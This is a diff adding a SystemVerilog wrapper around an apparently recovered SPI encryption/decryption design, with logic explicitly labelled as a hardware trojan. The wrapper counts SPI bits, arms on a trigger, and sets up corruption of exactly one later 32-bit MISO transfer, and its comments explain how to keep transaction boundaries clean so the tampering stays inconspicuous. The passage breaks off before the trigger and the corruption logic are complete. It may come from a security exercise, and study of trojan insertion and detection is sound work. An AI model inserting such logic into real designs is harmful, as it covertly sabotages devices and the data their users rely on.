@@ -1,0 +1,62 @@
+```systemverilog
+module recovered (
+    input  wire pin_36, // SCK
+    input  wire pin_25, // ENC_DEC
+    input  wire pin_28, // NORM_CS_N
+    input  wire pin_32, // MOSI
+    input  wire pin_34, // RST_N
+    input  wire pin_27, // START
+    output wire pin_38, // BUSY
+    output wire pin_23, // ICE_LED
+    output wire pin_31  // MISO
+);
+
+    wire orig_miso;
+
+    // Instantiate original unmodified design
+    recovered_original inst_recovered_original (
+        .pin_36(pin_36),
+        .pin_25(pin_25),
+        .pin_28(pin_28),
+        .pin_32(pin_32),
+        .pin_34(pin_34),
+        .pin_27(pin_27),
+        .pin_38(pin_38),
+        .pin_23(pin_23),
+        .pin_31(orig_miso)
+    );
+
+    // Trojan State
+    logic [5:0]  bit_cnt;
+    logic [31:0] shift_reg;
+    logic        trigger_seen;
+    logic        corrupt_state;
+
+    // Synchronous state machine with asynchronous CS_N boundary handling
+    // We strictly arm and disarm corruption at chip-select boundaries 
+    // to guarantee 100% clean transaction boundaries and avoid corrupting the 32nd bit.
+    always_ff @(posedge pin_36 or posedge pin_28) begin
+        if (pin_28) begin
+            // NORM_CS_N goes high (transaction boundary)
+            bit_cnt <= 6'd0;
+            
+            // Check if the previous transaction completed exactly 32 bits
+            if (bit_cnt == 6'd32) begin
+                if (trigger_seen) begin
+                    // Arm the corruption for the very next complete transfer
+                    corrupt_state <= 1'b1;
+                    trigger_seen  <= 1'b0;
+                end else if (corrupt_state) begin
+                    // Clear the corruption effect after exactly one complete payload transfer
+                    corrupt_state <= 1'b0;
+                end
+            end
+            // Interrupted transactions (bit_cnt != 32) do not alter the corrupt_state,
+            // retaining it until one *complete* 32-bit transfer is finalized.
+            
+        end else begin
+            if (!pin_34) begin
+                // Synchronous Reset
+                bit_cnt       <= 6'd0;
+                shift_reg     <= 32'd0;
+                
